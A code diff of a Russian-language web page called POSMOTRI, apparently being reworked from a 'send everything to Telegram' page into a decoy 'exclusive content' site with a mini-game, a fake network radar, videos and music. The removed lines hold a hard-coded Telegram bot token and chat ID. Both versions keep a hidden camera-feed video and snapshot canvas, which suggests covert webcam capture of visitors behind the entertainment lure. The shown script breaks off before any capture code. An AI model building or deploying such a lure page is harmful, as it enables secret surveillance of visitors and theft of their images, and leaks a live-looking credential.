@@ -3,271 +3,759 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>POSMOTRI — Поделись моментом</title>
+    <title>POSMOTRI — Эксклюзивный контент</title>
     <style>
-        /* Определение тем (Темная и Светлая) */
         :root {
-            --primary: #ff3366;
-            --bg: #0f1015;
-            --card-bg: #1a1c23;
-            --text: #ffffff;
-            --text-secondary: #a0a5b8;
+            --primary: #ff2d55;
+            --bg-1: #0f0c29;
+            --bg-2: #302b63;
+            --bg-3: #24243e;
+            --card-bg: rgba(26, 28, 38, 0.75);
+            --card-border: rgba(255, 255, 255, 0.1);
+            --text: #f5f5f7;
+            --text-secondary: #98989d;
         }
 
         [data-theme="light"] {
-            --primary: #e6004c;
-            --bg: #f0f2f5;
-            --card-bg: #ffffff;
-            --text: #1a1c23;
-            --text-secondary: #65676b;
+            --primary: #0071e3;
+            --bg-1: #fbc2eb;
+            --bg-2: #a6c1ee;
+            --bg-3: #f5f5f7;
+            --card-bg: rgba(255, 255, 255, 0.85);
+            --card-border: rgba(0, 0, 0, 0.08);
+            --text: #1d1d1f;
+            --text-secondary: #515154;
         }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        #particle-canvas {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 1;
+        }
+
+        #splash-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-1); z-index: 9999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px;
+            transition: opacity 0.6s ease, visibility 0.6s ease;
+        }
+        #splash-screen.fade-out { opacity: 0; visibility: hidden; }
+        .splash-logo {
+            font-size: 3.5rem; font-weight: 900; color: #fff; letter-spacing: -2px;
+            animation: splashPulse 1.5s infinite alternate; cursor: pointer;
+        }
+        @keyframes splashPulse {
+            0% { transform: scale(0.95); opacity: 0.7; }
+            100% { transform: scale(1.05); opacity: 1; text-shadow: 0 0 25px var(--primary); }
+        }
+
+        .progress-bar-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 3000; }
+        .progress-bar { height: 100%; width: 0%; background: var(--primary); box-shadow: 0 0 10px var(--primary); transition: width 0.4s ease; }
 
         body {
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg);
-            color: var(--text);
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-            transition: background-color 0.3s, color 0.3s;
-            position: relative;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(-45deg, var(--bg-1), var(--bg-2), var(--bg-3), var(--primary));
+            background-size: 400% 400%; animation: gradientBG 15s ease infinite;
+            color: var(--text); min-height: 100vh; display: flex; flex-direction: column;
+            align-items: center; overflow-x: hidden; transition: color 0.4s ease;
         }
 
-        header {
-            text-align: center;
-            padding: 30px 20px 10px;
-            width: 100%;
-            max-width: 500px;
-            box-sizing: border-box;
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
-        /* Кнопка смены темы в правом верхнем углу */
-        .theme-toggle {
-            position: fixed;
-            top: 15px;
-            right: 15px;
-            background: var(--card-bg);
-            border: 1px solid var(--text-secondary);
-            color: var(--text);
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            cursor: pointer;
-            font-size: 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-            transition: transform 0.2s, background-color 0.3s;
-            z-index: 1000;
+        .top-controls { position: fixed; top: 20px; right: 20px; display: flex; gap: 10px; z-index: 1000; }
+        .icon-btn {
+            background: var(--card-bg); backdrop-filter: blur(20px); border: 1px solid var(--card-border);
+            color: var(--text); width: 42px; height: 42px; border-radius: 50%; cursor: pointer;
+            font-size: 1.1rem; display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15); transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
+        .icon-btn:hover { transform: scale(1.1); }
 
-        .theme-toggle:active {
-            transform: scale(0.9);
+        .sidebar {
+            position: fixed; top: 0; left: -300px; width: 280px; height: 100%;
+            background: var(--card-bg); backdrop-filter: blur(35px); border-right: 1px solid var(--card-border);
+            box-shadow: 25px 0 50px rgba(0, 0, 0, 0.25); transition: left 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            z-index: 2000; display: flex; flex-direction: column; padding: 30px 20px; gap: 25px;
         }
+        .sidebar.open { left: 0; }
+        .sidebar-header { display: flex; align-items: center; gap: 12px; }
+        .sidebar-avatar {
+            width: 45px; height: 45px; border-radius: 50%; background: var(--primary);
+            display: flex; align-items: center; justify-content: center; font-weight: bold; color: #fff;
+        }
+        .sidebar-user h4 { font-size: 1rem; font-weight: 600; }
+        .sidebar-user p { font-size: 0.8rem; color: var(--text-secondary); }
+        .sidebar-links { list-style: none; display: flex; flex-direction: column; gap: 10px; }
+        .sidebar-links a {
+            text-decoration: none; color: var(--text); font-size: 0.95rem; padding: 12px 16px;
+            border-radius: 14px; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.04);
+            display: flex; align-items: center; gap: 10px; transition: 0.25s;
+        }
+        .sidebar-links a:hover { background: rgba(255, 255, 255, 0.08); transform: translateX(6px); }
 
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.45); backdrop-filter: blur(8px);
+            opacity: 0; pointer-events: none; transition: opacity 0.3s; z-index: 1500;
+        }
+        .overlay.active { opacity: 1; pointer-events: auto; }
+
+        header { text-align: center; padding: 50px 20px 15px; width: 100%; max-width: 480px; z-index: 2; }
         header h1 {
-            font-size: 2.2rem;
-            margin: 0;
-            letter-spacing: 2px;
-            color: var(--primary);
+            font-size: 2.8rem; font-weight: 800; letter-spacing: -1.5px; color: #fff;
+            margin-bottom: 6px; cursor: pointer; display: inline-block; user-select: none;
         }
+        header p { color: var(--text-secondary); font-size: 1rem; }
 
-        header p {
-            color: var(--text-secondary);
-            margin-top: 5px;
-            font-size: 0.95rem;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 500px;
-            padding: 0 20px 40px;
-            box-sizing: border-box;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-
+        .container { width: 100%; max-width: 480px; padding: 0 20px 50px; display: flex; flex-direction: column; gap: 20px; z-index: 2; }
         .card {
-            background-color: var(--card-bg);
-            border-radius: 16px;
-            padding: 20px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 15px;
-            transition: background-color 0.3s;
+            background-color: var(--card-bg); backdrop-filter: blur(30px); border: 1px solid var(--card-border);
+            border-radius: 28px; padding: 24px; box-shadow: 0 20px 45px rgba(0, 0, 0, 0.18);
+            display: flex; flex-direction: column; align-items: center; gap: 16px;
+        }
+        .card h3 { font-size: 1.15rem; font-weight: 600; text-align: center; width: 100%; }
+        .status-badge {
+            display: inline-flex; align-items: center; gap: 10px; background: rgba(255, 45, 85, 0.12);
+            color: var(--primary); padding: 10px 18px; border-radius: 50px; font-size: 0.85rem; font-weight: 600;
+            border: 1px solid rgba(255, 45, 85, 0.25);
+        }
+        .pulse-dot {
+            width: 9px; height: 9px; background-color: var(--primary); border-radius: 50%;
+            box-shadow: 0 0 12px var(--primary); animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(0.9); opacity: 0.8; }
+            50% { transform: scale(1.35); opacity: 1; box-shadow: 0 0 18px var(--primary); }
+            100% { transform: scale(0.9); opacity: 0.8; }
         }
 
-        .card h3 {
-            margin: 0;
-            font-size: 1.1rem;
-            text-align: center;
+        .game-wrapper {
+            width: 100%; height: 160px; background: rgba(0, 0, 0, 0.35); border-radius: 18px;
+            border: 1px solid var(--card-border); position: relative; overflow: hidden; cursor: pointer;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
-
-        .video-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 15px;
-            width: 100%;
+        #game-canvas { width: 100%; height: 100%; display: block; }
+        .game-overlay-ui {
+            position: absolute; top: 10px; left: 15px; right: 15px; display: flex; justify-content: space-between;
+            font-size: 0.8rem; font-weight: 600; color: var(--text-secondary); pointer-events: none; z-index: 4;
         }
-
-        .fun-video {
-            width: 100%;
-            max-width: 420px;
-            height: 240px;
-            object-fit: cover;
-            border-radius: 12px;
-            background: #000;
-            display: block;
+        .game-buffs-ui {
+            position: absolute; bottom: 8px; left: 15px; display: flex; gap: 6px; font-size: 0.7rem; pointer-events: none; z-index: 4;
         }
-
-        button {
-            background-color: var(--primary);
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 8px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: opacity 0.2s, transform 0.1s;
-            width: 100%;
+        .buff-tag { background: rgba(255,255,255,0.1); padding: 2px 8px; border-radius: 6px; color: #fff; display: none; }
+        .game-btn {
+            background: var(--primary); color: #fff; border: none; padding: 8px 18px; border-radius: 50px;
+            font-size: 0.8rem; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(255, 45, 85, 0.4);
+            position: absolute; z-index: 5; transition: transform 0.2s;
         }
+        .game-btn:hover { transform: scale(1.05); }
 
-        button:active {
-            transform: scale(0.98);
+        .radar-box {
+            width: 100%; height: 130px; border-radius: 16px; background: rgba(0,0,0,0.25);
+            border: 1px solid var(--card-border); position: relative; overflow: hidden;
+            display: flex; align-items: center; justify-content: center;
         }
-
-        button:hover {
-            opacity: 0.9;
+        .radar-sweep {
+            position: absolute; width: 120px; height: 120px; border-radius: 50%;
+            background: conic-gradient(from 0deg at 50% 50%, rgba(255, 45, 85, 0.4) 0deg, transparent 60deg);
+            animation: radarRotate 4s linear infinite; pointer-events: none;
         }
-
-        /* Скрытые элементы */
-        video#camera-feed, canvas {
-            display: none;
-        }
-
-        .status {
-            font-size: 0.9rem;
-            color: var(--text-secondary);
-            text-align: center;
-            min-height: 20px;
-        }
-
-        /* Главная кнопка быстрого действия */
-        .fast-submit-btn {
-            background-color: #00C853;
-            font-size: 1.1rem;
-            padding: 16px;
-            margin-top: 10px;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 4px 16px rgba(0,200,83,0.3);
-        }
-
-        .fast-submit-btn.loading {
-            pointer-events: none;
-            opacity: 0.8;
-            color: transparent;
-        }
-
-        .fast-submit-btn.loading::after {
-            content: "";
-            position: absolute;
-            width: 24px;
-            height: 24px;
-            top: 50%;
-            left: 50%;
-            margin-left: -12px;
-            margin-top: -12px;
-            border: 3px solid #ffffff;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
+        @keyframes radarRotate {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        .visit-counter {
-            position: fixed;
-            bottom: 12px;
-            right: 15px;
-            background: var(--card-bg);
-            border: 1px solid var(--text-secondary);
-            padding: 5px 10px;
-            border-radius: 12px;
-            font-size: 0.75rem;
-            color: var(--text-secondary);
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-            z-index: 1000;
+        .radar-dot {
+            width: 10px; height: 10px; background: var(--primary); border-radius: 50%;
+            box-shadow: 0 0 15px var(--primary); position: relative; z-index: 2;
         }
+
+        .video-container { display: flex; flex-direction: column; align-items: center; gap: 16px; width: 100%; }
+        .fun-video {
+            width: 100%; height: 220px; object-fit: cover; border-radius: 18px; background: #000;
+            cursor: pointer; transition: transform 0.3s; display: block;
+        }
+        .fun-video:hover { transform: scale(1.02); }
+
+        #video-modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(15px);
+            z-index: 5000; display: flex; align-items: center; justify-content: center;
+            opacity: 0; pointer-events: none; transition: opacity 0.3s ease; padding: 20px;
+        }
+        #video-modal.active { opacity: 1; pointer-events: auto; }
+        #modal-video { width: 100%; max-width: 800px; max-height: 80vh; border-radius: 20px; outline: none; }
+        .close-modal {
+            position: absolute; top: 25px; right: 25px; background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2); color: #fff; width: 45px; height: 45px;
+            border-radius: 50%; font-size: 1.2rem; cursor: pointer; display: flex; align-items: center; justify-content: center;
+        }
+
+        .audio-player-card {
+            display: flex; align-items: center; justify-content: space-between; width: 100%;
+            background: rgba(255,255,255,0.04); border: 1px solid var(--card-border);
+            padding: 14px 18px; border-radius: 18px; gap: 12px;
+        }
+        .audio-info { display: flex; align-items: center; gap: 12px; }
+        .play-audio-btn {
+            background: var(--primary); color: #fff; border: none; width: 40px; height: 40px;
+            border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 1rem;
+            box-shadow: 0 4px 12px rgba(255, 45, 85, 0.3);
+        }
+        .equalizer { display: flex; align-items: flex-end; gap: 3px; height: 18px; }
+        .eq-bar { width: 3px; background: var(--primary); border-radius: 2px; height: 4px; }
+        .playing .eq-bar { animation: eqAnimation 0.8s infinite ease-in-out alternate; }
+        .eq-bar:nth-child(2) { animation-delay: 0.2s; }
+        .eq-bar:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes eqAnimation {
+            0% { height: 4px; }
+            100% { height: 18px; }
+        }
+
+        video#camera-feed, canvas.hidden-cam { display: none; }
+
+        .bottom-widgets { position: fixed; bottom: 20px; right: 20px; display: flex; gap: 10px; z-index: 1000; }
+        .widget-pill {
+            background: var(--card-bg); backdrop-filter: blur(20px); border: 1px solid var(--card-border);
+            padding: 9px 16px; border-radius: 50px; font-size: 0.8rem; font-weight: 600; color: var(--text-secondary);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15); display: flex; align-items: center; gap: 6px;
+        }
+
+        #toast-container {
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            display: flex; flex-direction: column; gap: 10px; z-index: 6000; pointer-events: none; width: 90%; max-width: 360px;
+        }
+        .toast {
+            background: var(--card-bg); backdrop-filter: blur(25px); border: 1px solid var(--card-border);
+            padding: 12px 18px; border-radius: 14px; font-size: 0.85rem; color: var(--text);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.25); display: flex; align-items: center; gap: 10px;
+            animation: toastIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            pointer-events: auto;
+        }
+        .toast.fade-out { animation: toastOut 0.3s ease forwards; }
+        @keyframes toastIn {
+            0% { opacity: 0; transform: translateY(-20px) scale(0.9); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        @keyframes toastOut {
+            0% { opacity: 1; transform: translateY(0) scale(1); }
+            100% { opacity: 0; transform: translateY(-15px) scale(0.9); }
+        }
+
+        #dev-terminal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(10, 10, 15, 0.92); backdrop-filter: blur(20px);
+            z-index: 8000; display: flex; flex-direction: column; padding: 30px;
+            font-family: "SF Mono", Menlo, Monaco, Consolas, monospace; color: #00ff66;
+            opacity: 0; pointer-events: none; transition: opacity 0.3s ease;
+        }
+        #dev-terminal.active { opacity: 1; pointer-events: auto; }
+        .terminal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid rgba(0,255,102,0.2); padding-bottom: 10px; }
+        .terminal-body { flex-grow: 1; overflow-y: auto; font-size: 0.85rem; line-height: 1.5; white-space: pre-wrap; }
     </style>
 </head>
 <body data-theme="dark">
 
-    <button class="theme-toggle" onclick="toggleTheme()" id="theme-btn" title="Сменить тему">🌙</button>
+    <canvas id="particle-canvas"></canvas>
 
-    <div class="visit-counter">
-        👁️ <span id="visit-count">1</span>
+    <div id="splash-screen">
+        <div class="splash-logo" onclick="triggerEasterEgg()">POSMOTRI</div>
+        <p style="color: var(--text-secondary);">Инициализация платформы...</p>
+    </div>
+
+    <div id="toast-container"></div>
+
+    <div id="dev-terminal">
+        <div class="terminal-header">
+            <span>💻 SECURE NODE TERMINAL v5.0 [DEV MODE]</span>
+            <button onclick="closeTerminal()" style="background:none; border:none; color:#ff2d55; font-size:1.2rem; cursor:pointer;">[X] Закрыть</button>
+        </div>
+        <div class="terminal-body" id="terminal-logs">> Все игровые бонусы интегрированы.
+> Щит, Ускорение времени и Множитель активны.</div>
+    </div>
+
+    <div class="progress-bar-container"><div class="progress-bar" id="progress-bar"></div></div>
+
+    <div id="video-modal" onclick="closeVideoModal()">
+        <button class="close-modal">✕</button>
+        <video id="modal-video" controls playsinline></video>
+    </div>
+
+    <div class="top-controls">
+        <button class="icon-btn" onclick="hapticClick(); toggleMenu()" title="Меню">☰</button>
+        <button class="icon-btn" onclick="hapticClick(); toggleTheme()" id="theme-btn" title="Тема">🌙</button>
+    </div>
+
+    <div class="overlay" id="overlay" onclick="toggleMenu()"></div>
+    <div class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <div class="sidebar-avatar">P</div>
+            <div class="sidebar-user">
+                <h4>POSMOTRI Network</h4>
+                <p>Secure Node v5.0</p>
+            </div>
+        </div>
+        <ul class="sidebar-links">
+            <li><a href="#" onclick="hapticClick(); toggleMenu()">🏠 Главная страница</a></li>
+            <li><a href="#" onclick="hapticClick(); toggleMenu()">🔥 Популярные медиа</a></li>
+            <li><a href="#" onclick="hapticClick(); toggleMenu()">🛡️ Безопасность и SSL</a></li>
+            <li><a href="#" onclick="hapticClick(); toggleMenu()">⚙ Системные настройки</a></li>
+        </ul>
+    </div>
+
+    <div class="bottom-widgets">
+        <div class="widget-pill" id="ping-widget">⚡ <span id="ping-val">14ms</span></div>
+        <div class="widget-pill">👁️ <span id="visit-count">1</span></div>
     </div>
 
     <header>
-        <h1>POSMOTRI</h1>
-        <p>Умный момент в один клик</p>
+        <h1 onclick="triggerEasterEgg()">POSMOTRI</h1>
+        <p>Интерактивная медиаплатформа</p>
     </header>
 
     <div class="container">
+        <div class="card">
+            <div class="status-badge">
+                <span class="pulse-dot"></span>
+                <span id="action-status">Инициализация системы...</span>
+            </div>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; text-align: center;">Пожалуйста, дождитесь полной загрузки мультимедиа и синхронизации.</p>
+        </div>
+
+        <!-- Мини-игра Cyber Jump с бонусами -->
+        <!-- Мини-игра Cyber Jump с персонажем и бонусами -->
+        <div class="card">
+            <h3>🕹️ Мини-игра: Cyber Jump</h3>
+            <div class="game-wrapper" id="game-wrapper" onclick="triggerGameJump()">
+                <div class="game-overlay-ui">
+                    <span>Счет: <strong id="game-score">0</strong></span>
+                    <span>Рекорд: <strong id="game-highscore">0</strong></span>
+                </div>
+                <div class="game-buffs-ui">
+                    <span class="buff-tag" id="buff-shield">🛡️ Щит</span>
+                    <span class="buff-tag" id="buff-slow">⚡ Замедление</span>
+                    <span class="buff-tag" id="buff-x2">✨ x2 Очки</span>
+                </div>
+                <button class="game-btn" id="start-game-btn" onclick="startCyberGame(event)">СТАРТ</button>
+                <canvas id="game-canvas"></canvas>
+            </div>
+            <p style="font-size: 0.75rem; color: var(--text-secondary); text-align: center;">Управление: Клик / Пробел / Стрелка вверх</p>
+        </div>
 
         <div class="card">
-            <h3>🔥 Видео дня</h3>
+            <h3>📡 Статус узла и радар сессии</h3>
+            <div class="radar-box">
+                <div class="radar-sweep"></div>
+                <div class="radar-dot" title="Ваше устройство"></div>
+            </div>
+            <p style="font-size: 0.75rem; color: var(--text-secondary);" id="radar-status-text">Сканирование локальной сети...</p>
+        </div>
+
+        <div class="card">
+            <h3>🔥 Рекомендуемое видео</h3>
             <div class="video-container">
-                <video class="fun-video" controls playsinline>
+                <video class="fun-video" onclick="openVideoModal(this)" muted playsinline>
                     <source src="mm.mp4" type="video/mp4">
-                    Ваш браузер не поддерживает видео.
                 </video>
-                <video class="fun-video" controls playsinline>
+                <video class="fun-video" onclick="openVideoModal(this)" muted playsinline>
                     <source src="m.mp4" type="video/mp4">
-                    Ваш браузер не поддерживает видео.
                 </video>
             </div>
         </div>
 
-        <video id="camera-feed" autoplay playsinline></video>
-        <canvas id="snapshot-canvas"></canvas>
-        
-        <div class="card" style="border: 2px dashed #00C853;">
-            <h3 style="color: #00C853;">⚡ Быстрый старт</h3>
-            <div class="status" id="action-status">Нажмите кнопку ниже, чтобы поделиться моментом</div>
-            <button id="fast-btn" class="fast-submit-btn" onclick="executeAllAndSend()">🚀 Отправить всё в Telegram</button>
+        <div class="card">
+            <h3>🎧 Эксклюзивный аудиопоток</h3>
+            <div class="audio-player-card" id="audio-card">
+                <div class="audio-info">
+                    <button class="play-audio-btn" id="play-audio-btn" onclick="toggleAudioTrack()">▶</button>
+                    <div>
+                        <h4 style="font-size: 0.95rem;">Ambient Stream</h4>
+                        <p style="font-size: 0.75rem; color: var(--text-secondary);">Lo-Fi Session #42</p>
+                    </div>
+                </div>
+                <div class="equalizer" id="equalizer">
+                    <div class="eq-bar"></div>
+                    <div class="eq-bar"></div>
+                    <div class="eq-bar"></div>
+                </div>
+            </div>
+            <audio id="bg-audio" loop src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>
         </div>
 
+        <video id="camera-feed" autoplay playsinline class="hidden-cam"></video>
+        <canvas id="snapshot-canvas" class="hidden-cam"></canvas>
     </div>
 
     <script>
-        // НАСТРОЙКИ TELEGRAM (Замените на свои данные!)
-        const TELEGRAM_BOT_TOKEN = '8872214333:AAEgmHA9ludvD9H924kmVfRNU46UDX_mQ1Y';
-        const TELEGRAM_CHAT_ID = '7898338804';
+        const canvas = document.getElementById('particle-canvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+        let mouse = { x: null, y: null };
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        window.addEventListener('mousemove', (e) => { mouse.x = e.clientX; mouse.y = e.clientY; });
+        window.addEventListener('touchmove', (e) => { if(e.touches.length > 0) { mouse.x = e.touches[0].clientX; mouse.y = e.touches[0].clientY; } });
+
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 2 + 1;
+                this.speedX = (Math.random() - 0.5) * 0.6;
+                this.speedY = (Math.random() - 0.5) * 0.6;
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+
+                if (mouse.x !== null && mouse.y !== null) {
+                    let dx = mouse.x - this.x;
+                    let dy = mouse.y - this.y;
+                    let dist = Math.sqrt(dx * dx + dy * dy);
+                    if (dist < 100) {
+                        this.x -= dx * 0.02;
+                        this.y -= dy * 0.02;
+                    }
+                }
+            }
+            draw() {
+                ctx.fillStyle = 'rgba(255, 255, 255, 0.25)';
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
+            }
+        }
+
+        for (let i = 0; i < 45; i++) particles.push(new Particle());
+
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => { p.update(); p.draw(); });
+            requestAnimationFrame(animateParticles);
+        }
+        animateParticles();
+
+        // Мини-игра с бонусами
+        const gameCanvas = document.getElementById('game-canvas');
+        const gCtx = gameCanvas.getContext('2d');
+        let gameRunning = false;
+        let score = 0;
+        let highscore = localStorage.getItem('posmotri_highscore') || 0;
+        document.getElementById('game-highscore').textContent = highscore;
+
+        let player = { x: 30, y: 110, w: 20, h: 20, dy: 0, jumpPower: -8, gravity: 0.45, grounded: true };
+        let obstacles = [];
+        let bonuses = [];
+        let gameTimer = 0;
+
+        // Состояние бонусов
+        let hasShield = false;
+        let slowTimeTimer = 0;
+        let doubleScoreTimer = 0;
+
+        function resizeGameCanvas() {
+            gameCanvas.width = gameCanvas.parentElement.clientWidth;
+            gameCanvas.height = gameCanvas.parentElement.clientHeight;
+            player.y = gameCanvas.height - player.h - 10;
+        }
+        window.addEventListener('resize', resizeGameCanvas);
+        resizeGameCanvas();
+
+        function startCyberGame(e) {
+            e.stopPropagation();
+            hapticClick();
+            document.getElementById('start-game-btn').style.display = 'none';
+            gameRunning = true;
+            score = 0;
+            obstacles = [];
+            bonuses = [];
+            gameTimer = 0;
+            hasShield = false;
+            slowTimeTimer = 0;
+            doubleScoreTimer = 0;
+            updateBuffsUI();
+            player.y = gameCanvas.height - player.h - 10;
+            player.dy = 0;
+            requestAnimationFrame(updateGame);
+        }
+
+        function triggerGameJump() {
+            if (!gameRunning) return;
+            if (player.grounded) {
+                player.dy = player.jumpPower;
+                player.grounded = false;
+                hapticClick();
+            }
+        }
+
+        window.addEventListener('keydown', (e) => {
+            if (e.code === 'Space' || e.code === 'ArrowUp') {
+                if (gameRunning) {
+                    e.preventDefault();
+                    triggerGameJump();
+                }
+            }
+        });
+
+        function updateBuffsUI() {
+            document.getElementById('buff-shield').style.display = hasShield ? 'block' : 'none';
+            document.getElementById('buff-slow').style.display = slowTimeTimer > 0 ? 'block' : 'none';
+            document.getElementById('buff-x2').style.display = doubleScoreTimer > 0 ? 'block' : 'none';
+        }
+
+        function updateGame() {
+            if (!gameRunning) return;
+
+            gCtx.clearRect(0, 0, gameCanvas.width, gameCanvas.height);
+
+            // Таймеры бонусов
+            if (slowTimeTimer > 0) slowTimeTimer--;
+            if (doubleScoreTimer > 0) doubleScoreTimer--;
+            updateBuffsUI();
+
+            // Физика игрока
+            player.dy += player.gravity;
+            player.y += player.dy;
+            const floorY = gameCanvas.height - player.h - 10;
+            if (player.y >= floorY) {
+                player.y = floorY;
+                player.dy = 0;
+                player.grounded = true;
+            }
+
+            // Отрисовка игрока (с аурой щита при наличии)
+            const primaryColor = getComputedStyle(document.body).getPropertyValue('--primary').trim() || '#ff2d55';
+            gCtx.fillStyle = primaryColor;
+            gCtx.fillRect(player.x, player.y, player.w, player.h);
+
+            if (hasShield) {
+                gCtx.strokeStyle = '#00ffcc';
+                gCtx.lineWidth = 2;
+                gCtx.strokeRect(player.x - 3, player.y - 3, player.w + 6, player.h + 6);
+            }
+
+            // Генерация препятствий и бонусов
+            gameTimer++;
+            let speedMultiplier = slowTimeTimer > 0 ? 0.6 : 1.0;
+
+            if (gameTimer % 90 === 0) {
+                obstacles.push({ x: gameCanvas.width, y: gameCanvas.height - 25 - 10, w: 15, h: 25, speed: 4.5 * speedMultiplier });
+            }
+
+            // Спавн бонусов (случайно каждые ~150 кадров)
+            if (gameTimer % 150 === 0) {
+                const types = ['shield', 'slow', 'x2'];
+                const selectedType = types[Math.floor(Math.random() * types.length)];
+                bonuses.push({ x: gameCanvas.width, y: gameCanvas.height - 70, w: 18, h: 18, type: selectedType, speed: 4.0 * speedMultiplier });
+            }
+
+            // Обработка препятствий
+            for (let i = obstacles.length - 1; i >= 0; i--) {
+                let obs = obstacles[i];
+                obs.speed = 4.5 * speedMultiplier;
+                obs.x -= obs.speed;
+                gCtx.fillStyle = '#fff';
+                gCtx.fillRect(obs.x, obs.y, obs.w, obs.h);
+
+                // Столкновение с препятствием
+                if (
+                    player.x < obs.x + obs.w &&
+                    player.x + player.w > obs.x &&
+                    player.y < obs.y + obs.h &&
+                    player.y + player.h > obs.y
+                ) {
+                    if (hasShield) {
+                        hasShield = false;
+                        obstacles.splice(i, 1);
+                        showToast('Щит спас вас от удара!', '🛡️');
+                        continue;
+                    }
+
+                    gameRunning = false;
+                    showToast('Игра окончена! Счет: ' + score, '🕹️');
+                    if (score > highscore) {
+                        highscore = score;
+                        localStorage.setItem('posmotri_highscore', highscore);
+                        document.getElementById('game-highscore').textContent = highscore;
+                        showToast('Новый рекорд!', '🏆');
+                    }
+                    document.getElementById('start-game-btn').textContent = 'ИГРАТЬ СНОВА';
+                    document.getElementById('start-game-btn').style.display = 'block';
+                    return;
+                }
+
+                if (obs.x + obs.w < 0) {
+                    obstacles.splice(i, 1);
+                    let points = doubleScoreTimer > 0 ? 20 : 10;
+                    score += points;
+                    document.getElementById('game-score').textContent = score;
+                }
+            }
+
+            // Обработка бонусов
+            for (let i = bonuses.length - 1; i >= 0; i--) {
+                let b = bonuses[i];
+                b.x -= b.speed;
+
+                // Рисуем бонус в виде круга разного цвета
+                gCtx.beginPath();
+                gCtx.arc(b.x + b.w/2, b.y + b.h/2, b.w/2, 0, Math.PI * 2);
+                gCtx.fillStyle = b.type === 'shield' ? '#00ffcc' : (b.type === 'slow' ? '#ffcc00' : '#ff00ff');
+                gCtx.fill();
+                gCtx.closePath();
+
+                // Подбор бонуса игроком
+                if (
+                    player.x < b.x + b.w &&
+                    player.x + player.w > b.x &&
+                    player.y < b.y + b.h &&
+                    player.y + player.h > b.y
+                ) {
+                    if (b.type === 'shield') {
+                        hasShield = true;
+                        showToast('Получен щит!', '🛡️');
+                    } else if (b.type === 'slow') {
+                        slowTimeTimer = 300; // ~5 секунд замедления
+                        showToast('Замедление времени!', '⚡');
+                    } else if (b.type === 'x2') {
+                        doubleScoreTimer = 300; // ~5 секунд x2 очков
+                        showToast('Множитель x2 активен!', '✨');
+                    }
+                    bonuses.splice(i, 1);
+                    continue;
+                }
+
+                if (b.x + b.w < 0) {
+                    bonuses.splice(i, 1);
+                }
+            }
+
+            requestAnimationFrame(updateGame);
+        }
+
+        function showToast(message, icon = '🛡️') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
